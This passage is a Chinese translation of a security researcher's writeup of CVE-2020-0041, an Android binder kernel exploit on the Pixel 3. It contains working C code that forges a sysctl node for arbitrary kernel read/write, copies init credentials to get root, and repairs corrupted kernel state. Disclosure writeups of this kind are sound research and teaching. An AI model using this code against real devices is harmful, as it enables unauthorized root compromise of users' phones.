
因此，为了确保我们保持树的平衡，请使用我们的`*write8*`原语，向最左边的节点添加名称以“aaa”开头的左子节点。以下代码在`*prev_node中*`找到树的最左节点，这将是我们假节点的插入点：

```
/* Now we can prepare our magic sysctl node as s child of the left-most node */
uint64_t sysctl_table_root = kernel_base + SYSCTL_TABLE_ROOT_OFFSET;
printf("[+] sysctl_table_root = %lx\n", sysctl_table_root);
uint64_t ctl_dir = sysctl_table_root + 8;
uint64_t node = read64(ctl_dir + 80);
uint64_t prev_node;
while (node != 0) {
prev_node = node;
node = read64(node + 0x10);
}
```

为了插入新节点，我们需要在内核存储器中为其找到一个位置。这是必需的，因为现代移动手机都启用了PAN（永远访问权限），可以防止内核无意中使用用户区内存。假设我们有一个任意的读取原语，可以通过解析从`*current-> mm-> pgd*`开始的进程的页表，并在`*physmap中*`找到其中一个页面的地址来解决这个问题。另外，使用我们自己的用户空间页面的physmap别名是理想的选择，因为可以轻松地编辑节点以更改要定位的数据的地址，从而为我们提供了灵活的读/写原语。

通过以下方式解析physmap别名：

```
/* Now resolve our mapping at 2MB. But first read memstart_addr so we can do phys_to_virt() */
memstart_addr = read64(kernel_base + MEMSTART_ADDR_OFFSET);
printf("[+] memstart_addr: 0x%lx\n", memstart_addr);
uint64_t mm = read64(current + MM_OFFSET);
uint64_t pgd = read64(mm + 0x40);
uint64_t entry = read64(pgd);
uint64_t next_tbl = phys_to_virt(((entry & 0xffffffffffff)>>12)<< 12);
printf("[+] First level entry: %lx -> next table at %lx\n", entry, next_tbl);
/* Offset 8 for 2MB boundary */
entry = read64(next_tbl + 8);
next_tbl = phys_to_virt(((entry & 0xffffffffffff)>>12)<< 12);
printf("[+] Second level entry: %lx -> next table at %lx\n", entry, next_tbl);
entry = read64(next_tbl);
uint64_t kaddr = phys_to_virt(((entry & 0xffffffffffff)>>12)<< 12);
*(uint64_t *)map = 0xdeadbeefbadc0ded;
if ( read64(kaddr) != 0xdeadbeefbadc0ded) {
printf("[!] Something went wrong resolving the address of our mapping\n");
goto out;
}
```

请注意，我们需要读取`*memstart_addr*`的内容，以便能够在物理地址和相应的physmap地址之间进行转换。运行此代码后，在进程地址空间的`0x200000`处找到的数据也可以在内核`*域的kaddr*`中找到。

这样，就可以如下设置新的sysctl节点：

```
/* We found the insertion place, setup the node */
uint64_t node_kaddr = kaddr;
void *node_uaddr = map;
uint64_t tbl_header_kaddr = kaddr + 0x80;
void *tbl_header_uaddr = map + 0x80;
uint64_t ctl_table_kaddr = kaddr + 0x100;
ctl_table_uaddr = map + 0x100;
uint64_t procname_kaddr = kaddr + 0x200;
void * procname_uaddr = map + 0x200;
/* Setup rb_node */
*(uint64_t *)(node_uaddr + 0x00) = prev_node; // parent = prev_node
*(uint64_t *)(node_uaddr + 0x08) = 0; // right = null
*(uint64_t *)(node_uaddr + 0x10) = 0; // left = null
*(uint64_t *)(node_uaddr + 0x18) = tbl_header_kaddr; // my_tbl_header
*(uint64_t *)(tbl_header_uaddr) = ctl_table_kaddr;
*(uint64_t *)(tbl_header_uaddr + 0x18) = 0; // unregistering
*(uint64_t *)(tbl_header_uaddr + 0x20) = 0; // ctl_Table_arg
*(uint64_t *)(tbl_header_uaddr + 0x28) = sysctl_table_root; // root
*(uint64_t *)(tbl_header_uaddr + 0x30) = sysctl_table_root; // set
*(uint64_t *)(tbl_header_uaddr + 0x38) = sysctl_table_root + 8; // parent
*(uint64_t *)(tbl_header_uaddr + 0x40) = node_kaddr; // node
*(uint64_t *)(tbl_header_uaddr + 0x48) = 0; // inodes.first
/* Now setup ctl_table */
uint64_t proc_douintvec = kernel_base + PROC_DOUINTVEC_OFFSET;
*(uint64_t *)(ctl_table_uaddr) = procname_kaddr; // procname
*(uint64_t *)(ctl_table_uaddr + 8) = kernel_base; // data == what to read/write
*(uint32_t *)(ctl_table_uaddr + 16) = 0x8; // max size
*(uint64_t *)(ctl_table_uaddr + 0x20) = proc_douintvec; // proc_handler
*(uint32_t *)(ctl_table_uaddr + 20) = 0666; // mode = rw-rw-rw-
/*
* Compute and write the node name. We use a random name starting with aaa
* for two reasons:
*
* - Must be the first node in the tree alphabetically given where we insert it (hence aaa...)
*
* - If we already run, there's a cached dentry for each name we used earlier which has dangling
* pointers but is only reachable through path lookup. If we'd reuse the name, we'd crash using
* this dangling pointer at open time.
*
* It's easier to have a unique enough name instead of figuring out how to clear the cache,
* which would be the cleaner solution here.
*/
int fd = open("/dev/urandom", O_RDONLY);
uint32_t rnd;
read(fd, &rnd, sizeof(rnd));
sprintf(procname_uaddr, "aaa_%x", rnd);
sprintf(pathname, "/proc/sys/%s", procname_uaddr);
/* And finally use a write8 to inject this new sysctl node */
struct exp_node *write8_sysctl = node_new("write8_sysctl");
node_write8(write8_sysctl, kaddr, prev_node + 16);
```

在`*/ proc / sys / aaa_ [random]中*`创建一个具有读/写权限的文件，并使用`*proc_douintvec*`处理读/写。此函数将`*数据*`字段作为要读取或写入的指针，并允许最多以无符号整数读取或写入`*max_size*`个字节。

这样，我们可以如下设置写原语：

```
void write64(uint64_t addr, uint64_t value) {
*(uint64_t *)(ctl_table_uaddr + 8) = addr; // data == what to read/write
*(uint32_t *)(ctl_table_uaddr + 16) = 0x8;
char buf[100];
int fd = open(pathname, O_WRONLY);
if (fd < 0) {
printf("[!] Failed to open. Errno: %d\n", errno);
}
sprintf(buf, "%u %u\n", (uint32_t)value, (uint32_t)(value >> 32));
int ret = write(fd, buf, strlen(buf));
if (ret < 0)
printf("[!] Failed to write, errno: %d\n", errno);
close(fd);
}
void write32(uint64_t addr, uint32_t value) {
*(uint64_t *)(ctl_table_uaddr + 8) = addr; // data == what to read/write
*(uint32_t *)(ctl_table_uaddr + 16) = 4;
char buf[100];
int fd = open(pathname, O_WRONLY);
sprintf(buf, "%u\n", value);
write(fd, buf, strlen(buf));
close(fd);
}
```

## 0x08 获得 root 权限

一旦我们在Pixel手机上具有读/写功能，获得root访问权限就像从root任务复制凭据一样简单。由于我们早先已经禁用了SELinux，因此只需要查找初始化凭据，增加其引用计数并将它们复制到我们的进程中，如下所示：

```
/* Set refcount to 0x100 and set our own credentials to init's */
write32(init_cred, 0x100);
write64(current + REAL_CRED_OFFSET, init_cred);
write64(current + REAL_CRED_OFFSET + 8, init_cred);
if (getuid() != 0) {
printf("[!!] Something went wrong, we're not root!!\n");
goto out;
}
```

但是，还有一些工作要完成，因为我们已经破坏了内核领域的相当多的内存，一旦退出当前进程并执行shell，事情就会崩溃。我们需要修复一些事情：

- 通过sendmsg重新分配了用于执行写原语的`*binder_node*`结构，但在执行写操作时再次将其释放。我们需要确保相应的线程在从sendmsg返回时不会再次释放这些对象。为此解析线程堆栈，并用<a href="elink@3a9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2L8X3c8J5L8$3W2V1i4K6u0W2k6$3!0G2k6$3I4W2M7$3!0#2M7X3y4W2i4K6u0W2j5$3!0E0i4K6u0r3K9$3g2J5L8X3g2D9i4K6u0r3L8i4y4E0i4K6u0r3i4K6u0n7i4K6u0r3M7X3g2X3M7#2)9J5c8Y4c8S2k6%4y4Q4x3V1k6S2L8X3c8J5L8$3W2V1i4K6u0V1x3e0m8Q4x3X3f1H3i4K6u0W2x3q4)9#2k6Y4t1H3i4K6u0W2y4o6u0Q4x3V1k6A6L8X3y4D9N6h3c8W2i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6K6L8r3q4T1i4K6u0W2K9q4)9J5x3K6p5H3z5b7`.`.">ZERO_SIZE_PTR</a>替换对这些节点的所有引用。

- 我们已经修改了`*f_inode*`一个的`*结构文件*`，它现在指向到一个中间`*epitem*`。解决此问题的最简单方法是简单地增加该文件的引用计数，以使永远不会调用release。

- 在设置读取原语时，我们还破坏了`*表位*`本身中的一个字段。此字段是一个链表一个`*epitem*`而已，所以我们可以只复制`*fllist.prev*`上的`*fllist.next*`恢复列表。

- 我们还在`*/ proc / sys中*`添加了一个伪造的条目，可以保留它，但是在那种情况下，它将指向属于我们的漏洞利用的页面，并且现在被内核回收了，我们决定只将其从rb-tree中删除。请注意，这会使该条目从userland中消失，但是内核中仍然有一个缓存的路径，由于我们使用的是随机名称，因此将来很少有人尝试通过直接打开它来访问它。

清除所有这些混乱之后，最终可以执行我们的root shell并看到uid 0而不会导致手机崩溃。

## 0x09 漏洞利用演示

以下视频显示了使用我们刚刚描述的漏洞从adb shell root手机的过程：

```
https://static.bluefrostsecurity.de/img/labs/blog/num_valid_root.mp4
```

![](upload/attach/202005/823237_3A7S8C9MRVDE8HR.png)

![](upload/attach/202005/823237_VNUYJFDSEPWT3PV.png)

可以在<a href="elink@73bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8s2g2W2k6Y4u0G2M7%4c8K6k6h3y4#2M7X3W2@1P5g2)9J5c8V1y4h3c8g2)9J5k6o6t1H3x3U0m8Q4x3X3b7H3x3o6b7I4i4K6u0r3">Blue Frost Security GitHub上找到</a>本文和上<a href="elink@8a2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6D9j5h3u0K6i4K6u0W2j5X3I4#2k6h3k6J5L8%4y4@1M7$3g2U0N6i4u0A6N6s2W2Q4x3X3g2V1k6g2)9J5c8X3u0D9L8$3N6Q4x3V1j5J5x3o6t1H3i4K6u0r3x3o6y4Q4x3V1j5K6x3g2)9J5c8X3y4$3k6g2)9J5k6o6t1H3x3U0m8Q4x3X3b7H3x3o6b7I4i4K6u0V1M7r3q4J5N6q4)9J5k6o6q4Q4x3X3c8K6j5h3&6V1j5X3!0^5i4K6u0V1k6i4y4U0j5i4m8W2i4K6u0r3">一篇文章</a>中描述的漏洞利用代码。自2020年2月起，该漏洞仅在使用固件的Pixel 3手机上进行了测试，并且需要针对其他固件进行调整。特别是，漏洞利用中使用了许多内核偏移，以及在内核版本之间可能有所不同的结构偏移。

```
https://github.com/bluefrostsecurity/CVE-2020-0041/
https://labs.bluefrostsecurity.de/blog/2020/03/31/cve-2020-0041-part-1-sandbox-escape/
```

原文地址，如有不妥可参考原文：
